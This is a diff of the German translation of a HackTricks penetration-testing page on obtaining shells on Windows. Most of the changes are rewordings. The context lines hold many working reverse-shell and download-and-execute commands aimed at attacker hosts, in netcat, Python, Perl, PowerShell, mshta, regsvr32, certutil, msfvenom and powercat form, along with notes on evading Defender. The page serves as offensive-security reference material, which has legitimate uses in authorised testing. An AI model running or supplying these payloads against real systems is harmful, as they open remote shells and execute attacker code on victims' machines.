@@ -7,16 +7,16 @@
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
 * Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
-* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
+* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositorys einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -33,7 +33,7 @@ nc.exe -e cmd.exe <Attacker_IP> <PORT>
 ```
 ## SBD
 
-**[sbd](https://www.kali.org/tools/sbd/) ist eine portable und sichere Netcat-Alternative**. Es funktioniert auf Unix-ähnlichen Systemen und Win32. Mit Funktionen wie starker Verschlüsselung, Programm-Ausführung, anpassbaren Quellports und kontinuierlicher Wiederverbindung bietet sbd eine vielseitige Lösung für TCP/IP-Kommunikation. Für Windows-Benutzer kann die sbd.exe-Version aus der Kali Linux-Distribution als zuverlässiger Ersatz für Netcat verwendet werden.
+**[sbd](https://www.kali.org/tools/sbd/) ist eine portable und sichere Netcat-Alternative**. Es funktioniert auf Unix-ähnlichen Systemen und Win32. Mit Funktionen wie starker Verschlüsselung, Programm-Ausführung, anpassbaren Quellports und kontinuierlicher Wiederverbindung bietet sbd eine vielseitige Lösung für die TCP/IP-Kommunikation. Für Windows-Benutzer kann die sbd.exe-Version aus der Kali Linux-Distribution als zuverlässiger Ersatz für Netcat verwendet werden.
 ```bash
 # Victims machine
 sbd -l -p 4444 -e bash -v -n
@@ -46,37 +46,27 @@ id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 ## Python
-
-Python ist eine beliebte Programmiersprache für die Entwicklung von Shell-Skripten auf Windows-Systemen. Es bietet eine Vielzahl von Funktionen und Bibliotheken, die das Erstellen leistungsfähiger Shells erleichtern. Python-Skripte können auf Windows-Systemen ausgeführt werden, um verschiedene Aufgaben auszuführen, einschließlich Dateioperationen, Netzwerkkommunikation und Systemmanipulation. Es ist eine vielseitige Sprache, die von Hackern häufig verwendet wird, um benutzerdefinierte Shells für spezifische Anforderungen zu erstellen.
 ```bash
 #Windows
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
 
-Perl ist eine beliebte Skriptsprache, die von Hackern verwendet wird, um Shell-Zugriff auf Windows-Systeme zu erhalten. Es gibt verschiedene Tools und Skripte, die in Perl geschrieben sind und die bei der Erstellung von Shells auf Windows-Systemen helfen.
+Perl ist eine beliebte Skriptsprache, die von Hackern verwendet wird, um Shell-Zugriff auf Windows-Systeme zu erhalten. Perl-Skripte können verwendet werden, um Reverse-Shells zu erstellen, die es einem Angreifer ermöglichen, eine Verbindung zu einem infizierten System herzustellen und Befehle auszuführen. Perl bietet eine Vielzahl von Funktionen und Bibliotheken, die es Hackern ermöglichen, effektive Angriffe durchzuführen.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-### Windows
-
-#### Meterpreter
-
-Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection stagers and is extended over the network at runtime. It communicates over the stager socket and provides a comprehensive client-side Ruby API. It features command history, tab completion, channels, and more.
-
-#### Shell
-
-The Windows shell is a command interpreter. It is the traditional user interface for the Windows operating system. It takes commands you enter and passes them to the operating system to be executed. The shell can be accessed via various methods, including the command prompt and PowerShell.
+Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen und Skripten verwendet wird. Ruby wird oft für die Erstellung von Shells auf Windows-Systemen verwendet. Es gibt verschiedene Tools und Frameworks, die Ruby-Shells auf Windows-Systemen erstellen können.
 ```bash
 #Windows
 ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 ```
 ## Lua
 
-Lua ist eine leistungsstarke, effiziente, leichte und eingebettete Skriptsprache. Lua wird häufig für die Erstellung von Skripten und Automatisierungsaufgaben in verschiedenen Anwendungen verwendet. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden und bieten eine flexible Möglichkeit, die Funktionalität von Anwendungen zu erweitern. Lua wird auch häufig in der Spieleentwicklung und in anderen Bereichen eingesetzt, in denen Skripting erforderlich ist.
+Lua ist eine leistungsstarke, effiziente, leichtgewichtige, eingebettete Skriptsprache. Lua wird häufig für die Erstellung von Skripten und Automatisierungsaufgaben in verschiedenen Anwendungen verwendet. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden und bieten eine flexible Möglichkeit, die Funktionalität von Anwendungen zu erweitern. Lua wird oft als Skriptsprache in Spielen, Webservern und anderen Anwendungen eingesetzt.
 ```bash
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
@@ -97,23 +87,19 @@ openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_clien
 openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
 ```
 ## Powershell
-
-Powershell ist eine leistungsstarke Befehlszeilenshell, die von Microsoft entwickelt wurde und auf .NET Framework basiert. Es bietet eine Vielzahl von Funktionen und Befehlen, die für das Durchführen von Aufgaben im Windows-Betriebssystem nützlich sind. Powershell kann für das Ausführen von Skripten, das Automatisieren von Aufgaben und das Interagieren mit dem Betriebssystem verwendet werden. Es ist ein beliebtes Werkzeug für Hacker aufgrund seiner Flexibilität und Funktionsvielfalt.
 ```bash
 powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
 powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
 Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
 ```
-Prozess, der Netzwerkanruf ausführt: **powershell.exe**\
+Prozess, der Netzwerkanruf durchführt: **powershell.exe**\
 Payload auf Festplatte geschrieben: **NEIN** (_zumindest nirgendwo, wo ich es mit procmon finden konnte!_)
 ```bash
 powershell -exec bypass -f \\webdavserver\folder\payload.ps1
 ```
 Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
 Payload auf Festplatte geschrieben: **WebDAV-Client-Lokalcache**
-
-**Einzeiler:**
 ```bash
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -133,13 +119,13 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS-Hintertür)**
+#### **Beispiel für eine hta-psh Reverse-Shell (Verwendung von hta zum Herunterladen und Ausführen eines PS-Backdoors)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
-**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager HTA verwenden**
+**Sie können sehr einfach einen Koadic-Zombie herunterladen und ausführen, indem Sie den Stager hta verwenden**
 
-#### HTA-Beispiel
+#### hta Beispiel
 
 [**Von hier aus**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
 ```xml
@@ -176,7 +162,7 @@ var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 ```
 #### **Mshta - Metasploit**
 
-Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using Mshta. This technique can be used to bypass application whitelisting and execute code on a target system.
+Mshta is a utility in Windows that executes Microsoft HTML Applications (HTA). Metasploit has a module that can be used to execute malicious HTA payloads using mshta.exe. This technique can be used to bypass application whitelisting and execute arbitrary code on a target system.
 ```bash
 use exploit/windows/misc/hta_server
 msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
@@ -208,7 +194,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http
 
 **Rundll32 - sct**
 
-[**Von hier aus**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
+[**Von hier**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
 ```xml
 <?XML version="1.0"?>
 <!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
@@ -278,7 +264,7 @@ set lhost 10.2.0.5
 run
 #You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
 ```
-**Sie können sehr einfach einen Koadic-Zombie mithilfe des Stagers regsvr herunterladen und ausführen**
+**Sie können sehr einfach einen Koadic Zombie mithilfe des Stagers regsvr herunterladen und ausführen**
 
 ## Certutil
 
@@ -288,7 +274,7 @@ Laden Sie eine B64dll herunter, decodieren Sie sie und führen Sie sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
-Lade eine B64exe herunter, dekodiere sie und führe sie aus.
+Laden Sie eine B64exe herunter, decodieren Sie sie und führen Sie sie aus.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
 ```
@@ -309,7 +295,7 @@ msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > sh
 ```bash
 \\webdavserver\folder\batchfile.bat
 ```
-Prozess, der Netzwerkanruf durchführt: **svchost.exe**\
+Prozess, der Netzwerkanruf ausführt: **svchost.exe**\
 Payload auf Festplatte geschrieben: **WebDAV-Client-Lokalcache**
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
@@ -375,7 +361,7 @@ Kompilieren Sie C#-Code auf dem Opferrechner.
 ```
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
 ```
-Du kannst eine einfache C# Reverse-Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
+Du kannst eine grundlegende C# Reverse-Shell von hier herunterladen: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)
 
 **Nicht erkannt**
 
@@ -409,7 +395,7 @@ Im **Shells**-Ordner gibt es viele verschiedene Shells. Um _Invoke-PowerShellTcp
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Starten Sie das Skript auf einem Webserver und führen Sie es auf der Seite des Opfers aus:
+Starte den Skript auf einem Webserver und führe es auf dem Endgerät des Opfers aus:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -427,7 +413,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 
 ```
 Defender erkennt es nicht als bösartigen Code (noch nicht, 3/04/2019).
 
-**Andere von Powercat angebotene Optionen:**
+**Andere von powercat angebotene Optionen:**
 
 Bind-Shell, Reverse-Shell (TCP, UDP, DNS), Portumleitung, Upload/Download, Payloads generieren, Dateien bereitstellen...
 ```
@@ -456,11 +442,11 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 
 ```
 **Als bösartiger Code erkannt**
 
-### MSF-Einhorn
+### MSF-Unicorn
 
 [https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)
 
-Erstellen Sie eine PowerShell-Version des Metasploit-Backdoors unter Verwendung von Einhorn
+Erstellen Sie eine PowerShell-Version des Metasploit-Backdoors unter Verwendung von Unicorn
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
@@ -468,7 +454,7 @@ Starte msfconsole mit der erstellten Ressource:
 ```
 msfconsole -r unicorn.rc
 ```
-Starten Sie einen Webserver, der die _powershell\_attack.txt_ Datei bereitstellt und führen Sie im Opfer aus:
+Starte einen Webserver, der die Datei _powershell\_attack.txt_ bereitstellt, und führe auf dem Opfer aus:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 ```
@@ -476,7 +462,7 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
 
 ## Mehr
 
-[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen offensiven PS-Modulen vorab geladen (verschlüsselt)\
+[PS>Attack](https://github.com/jaredhaight/PSAttack) PS-Konsole mit einigen vorab geladenen offensiven PS-Modulen (verschlüsselt)\
 [https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
 WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensiven PS-Modulen und Proxy-Erkennung (IEX)
 
@@ -492,7 +478,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensi
 ​
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -502,10 +488,10 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS-Konsole mit einigen offensi
 
 Andere Möglichkeiten, HackTricks zu unterstützen:
 
-* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
+* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.
 
 </details>
